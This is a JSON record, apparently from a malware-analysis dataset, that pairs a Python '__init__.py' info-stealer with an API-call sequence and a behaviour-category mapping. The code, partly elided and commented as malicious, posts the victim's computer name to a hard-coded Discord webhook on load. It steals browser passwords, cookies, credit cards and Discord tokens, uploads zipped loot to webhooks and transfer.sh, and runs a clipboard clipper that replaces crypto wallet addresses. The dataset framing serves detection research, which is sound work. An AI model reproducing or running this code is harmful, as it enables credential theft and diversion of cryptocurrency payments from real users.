[
  {
    "pyfile": "__init__.py",
    "code_snippet": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious configuration and initial exfiltration ---\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://discord.com/api/webhooks/1104290142912528457/TVOxheeA7nJpxR8ojtb8CsoHPjQx0OFpnr-fuecUZQ5ngkNiw5OFsBK2EItGRWra1DSV\", json=data)\n\n__config__ = {\n    \"yourwebhookurl\": \"https://k8c7nxg6riaq9nueln6wjd.hooks.webhookrelay.com/\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    ...\n}\n\n# --- Malicious class for clipboard crypto address swapping (crypto-clipper) ---\nclass auto_copy_wallet(...):\n    ...\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search(\n                \"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search(\"addr1[a-z0-9]+\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    ...\n\n# --- Malicious class for credential, token, and file theft ---\nclass first_function_bc(...):\n    ...\n    async def init(self):\n        ...\n        # Steal browser data, Discord tokens, cookies, passwords, history, credit cards\n        ...\n        for name, path in self.browsers.items():\n            if not os.path.isdir(path):\n                continue\n            self.masterkey = self.mykey_gtm(path + \"\\\\Local State\")\n            self.funcs = [\n                self.steal_cookies2,\n                self.steal_history2,\n                self.steal_passwords2,\n                self.steal_cc2,\n            ]\n            for profile in self.profiles:\n                for func in self.funcs:\n                    try:\n                        func(name, path, profile)\n                    except:\n                        pass\n        ...\n        # Exfiltrate data\n        self.natify_matched_tokens()\n        await self.disco_injection()\n        self.ping_on_running()\n        self.finished_bc()\n    ...\n    def find_bctoken(self):\n        # Steal Discord tokens from various browsers and validate them\n        ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            ...\n            for filname in os.listdir(path):\n                if filname[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{filname}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(self.regex, line):\n                        try:\n                            r = requests.get(\n                                self.baseurl,\n                                headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                    \"Content-Type\": \"application/json\",\n                                    \"Authorization\": token,\n                                },\n                            )\n                        except Exception:\n                            pass\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in self.bc_id:\n                                self.tokens.append(token)\n                                self.bc_id.append(uid)\n        ...\n    def steal_passwords2(self, name: str, path: str, profile: str):\n        # Steal passwords from browser profile\n        ...\n    def steal_cookies2(self, name: str, path: str, profile: str):\n        # Steal cookies from browser profile\n        ...\n    def steal_passwords(self):\n        # Steal Chrome passwords\n        ...\n    def steal_cookies(self):\n        # Steal Chrome cookies\n        ...\n    def steal_history2(self, name: str, path: str, profile: str):\n        # Steal browser history\n        ...\n    def steal_cc2(self, name: str, path: str, profile: str):\n        # Steal credit card data\n        ...\n    def finished_bc(self):\n        # Zip and exfiltrate all stolen data\n        ...\n        _zipfile = ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        ...\n        with open(_zipfile, \"rb\") as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={\"upload_file\": f})\n        os.remove(_zipfile)\n    ...\n\n# --- Malicious functions for mass browser data theft and exfiltration ---\ndef Find_Passw(path, arg):\n    ...\n    # Steal passwords from browser database, decrypt, and collect for exfiltration\n    ...\ndef Get_Bc_Cook(path, arg):\n    ...\n    # Steal cookies from browser database, decrypt, and collect for exfiltration\n    ...\ndef upload(name, tk=\"\"):\n    ...\n    # Exfiltrate files and data to attacker's webhook\n    ...\ndef bc_Gather_All():\n    ...\n    # Orchestrate browser data theft and exfiltration for multiple browsers\n    ...\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef check_spec_bc():\n    ...\n    # Search for files with sensitive keywords on Desktop, Downloads, Documents, upload to attacker\n    ...\n\n# --- Main execution: run all malicious actions ---\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "httpx.post",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "os.path.isdir",
        "first_function_bc.mykey_gtm",
        "first_function_bc.steal_cookies2",
        "first_function_bc.steal_history2",
        "first_function_bc.steal_passwords2",
        "first_function_bc.steal_cc2",
        "first_function_bc.natify_matched_tokens",
        "first_function_bc.disco_injection",
        "first_function_bc.ping_on_running",
        "first_function_bc.finished_bc",
        "os.path.exists",
        "os.listdir",
        "open",
        "open.readlines",
        "re.findall",
        "requests.get",
        "requests.get.status_code",
        "requests.get.json",
        "ntpath.join",
        "zipfile.ZipFile",
        "open",
        "httpx.post",
        "httpx.post",
        "os.remove",
        "open",
        "requests.post",
        "threading.Thread",
        "threading.Thread.start",
        "time.sleep"
      ],
      "api_sequence_with_args": [
        "os.getenv(\"COMPUTERNAME\")",
        "httpx.post(\"https://discord.com/api/webhooks/1104290142912528457/TVOxheeA7nJpxR8ojtb8CsoHPjQx0OFpnr-fuecUZQ5ngkNiw5OFsBK2EItGRWra1DSV\", json=data)",
        "pyperclip.paste()",
        "re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data)",
        "pyperclip.copy(self.address_btc)",
        "pyperclip.paste()",
        "re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data)",
        "pyperclip.copy(self.address_eth)",
        "pyperclip.paste()",
        "re.search(\"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\", clipboard_data)",
        "pyperclip.copy(self.address_xchain)",
        "pyperclip.paste()",
        "re.search(\"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\", clipboard_data)",
        "pyperclip.copy(self.address_pchain)",
        "pyperclip.paste()",
        "re.search(\"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\", clipboard_data)",
        "pyperclip.copy(self.address_cchain)",
        "pyperclip.paste()",
        "re.search(\"addr1[a-z0-9]+\", clipboard_data)",
        "pyperclip.copy(self.address_ada)",
        "pyperclip.paste()",
        "re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data)",
        "pyperclip.copy(self.address_dash)",
        "pyperclip.paste()",
        "re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data)",
        "pyperclip.copy(self.address_monero)",
        "pyperclip.paste()",
        "os.path.isdir(path)",
        "first_function_bc.mykey_gtm(path + \"\\\\Local State\")",
        "first_function_bc.steal_cookies2(name, path, profile)",
        "first_function_bc.steal_history2(name, path, profile)",
        "first_function_bc.steal_passwords2(name, path, profile)",
        "first_function_bc.steal_cc2(name, path, profile)",
        "first_function_bc.natify_matched_tokens()",
        "first_function_bc.disco_injection()",
        "first_function_bc.ping_on_running()",
        "first_function_bc.finished_bc()",
        "os.path.exists(path)",
        "os.listdir(path)",
        "open(f\"{path}\\\\{filname}\", errors=\"ignore\")",
        "open(f\"{path}\\\\{filname}\", errors=\"ignore\").readlines()",
        "re.findall(self.regex, line)",
        "requests.get(self.baseurl, headers={...})",
        "requests.get.status_code",
        "requests.get.json()",
        "ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")",
        "zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)",
        "open(_zipfile, \"rb\")",
        "httpx.post(self.discord_webhook, json=embed)",
        "httpx.post(self.discord_webhook, files={\"upload_file\": f})",
        "os.remove(_zipfile)",
        "open(path, mode=\"rb\")",
        "requests.post(\"https://transfer.sh/\", files=files)",
        "threading.Thread(target=auto_copy_wallet().run)",
        "threading.Thread.start()",
        "time.sleep(0.2)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "first_function_bc.mykey_gtm",
          "id": "get_chrome_master_key",
          "description": "Retrieves and decrypts Chrome master key",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "password_theft"
        },
        {
          "api_name": "first_function_bc.steal_cookies2",
          "id": "get_chrome_cookies",
          "description": "Retrieves Chrome browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "first_function_bc.steal_history2",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "first_function_bc.steal_passwords2",
          "id": "get_chrome_password",
          "description": "Retrieves Chrome password value",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "password_theft"
        },
        {
          "api_name": "first_function_bc.steal_cc2",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "first_function_bc.natify_matched_tokens",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "first_function_bc.disco_injection",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "first_function_bc.ping_on_running",
          "id": "send_discord_message",
          "description": "Sends message to Discord channel",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "first_function_bc.finished_bc",
          "id": "create_zip_archive",
          "description": "Creates new ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.readlines",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.status_code",
          "id": "get_http_status",
          "description": "Retrieves HTTP response status code",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "create_zip_archive",
          "description": "Creates new ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        }
      ],
      "contextual_code": "import os\nimport httpx\nimport pyperclip\nimport re\nimport threading\nimport time\nimport ntpath\nimport zipfile\nimport requests\n\n# --- Malicious configuration and initial exfiltration ---\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://discord.com/api/webhooks/1104290142912528457/TVOxheeA7nJpxR8ojtb8CsoHPjQx0OFpnr-fuecUZQ5ngkNiw5OFsBK2EItGRWra1DSV\", json=data)\n\n# --- Malicious class for clipboard crypto address swapping (crypto-clipper) ---\nclass auto_copy_wallet(...):\n    ...\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search(\"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search(\"^0x[a-fA-F0-9]{40}$\", clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search(\n                \"^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search(\n                \"^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$\",\n                clipboard_data,\n            ):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search(\"addr1[a-z0-9]+\", clipboard_data):\n                if clipboard_data not in [\n                    self.address_btc,\n                    self.address_eth,\n                    self.address_xchain,\n                    self.address_pchain,\n                    self.address_cchain,\n                    self.address_monero,\n                    self.address_ada,\n                    self.address_dash,\n                ]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search(\"/X[1-9A-HJ-NP-Za-km-z]{33}$/g\", clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search(\"/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g\", clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [\n                        self.address_btc,\n                        self.address_eth,\n                        self.address_xchain,\n                        self.address_pchain,\n                        self.address_cchain,\n                        self.address_monero,\n                        self.address_ada,\n                        self.address_dash,\n                    ]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    ...\n\n# --- Malicious class for credential, token, and file theft ---\nclass first_function_bc(...):\n    ...\n    async def init(self):\n        ...\n        for name, path in self.browsers.items():\n            if not os.path.isdir(path):\n                continue\n            self.masterkey = self.mykey_gtm(path + \"\\\\Local State\")\n            self.funcs = [\n                self.steal_cookies2,\n                self.steal_history2,\n                self.steal_passwords2,\n                self.steal_cc2,\n            ]\n            for profile in self.profiles:\n                for func in self.funcs:\n                    try:\n                        func(name, path, profile)\n                    except:\n                        pass\n        ...\n        self.natify_matched_tokens()\n        await self.disco_injection()\n        self.ping_on_running()\n        self.finished_bc()\n    ...\n    def find_bctoken(self):\n        ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            ...\n            for filname in os.listdir(path):\n                if filname[-3:] not in [\"log\", \"ldb\"]:\n                    continue\n                for line in [\n                    x.strip()\n                    for x in open(f\"{path}\\\\{filname}\", errors=\"ignore\").readlines()\n                    if x.strip()\n                ]:\n                    for token in re.findall(self.regex, line):\n                        try:\n                            r = requests.get(\n                                self.baseurl,\n                                headers={\n                                    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\",\n                                    \"Content-Type\": \"application/json\",\n                                    \"Authorization\": token,\n                                },\n                            )\n                        except Exception:\n                            pass\n                        if r.status_code == 200:\n                            uid = r.json()[\"id\"]\n                            if uid not in self.bc_id:\n                                self.tokens.append(token)\n                                self.bc_id.append(uid)\n        ...\n    def finished_bc(self):\n        ...\n   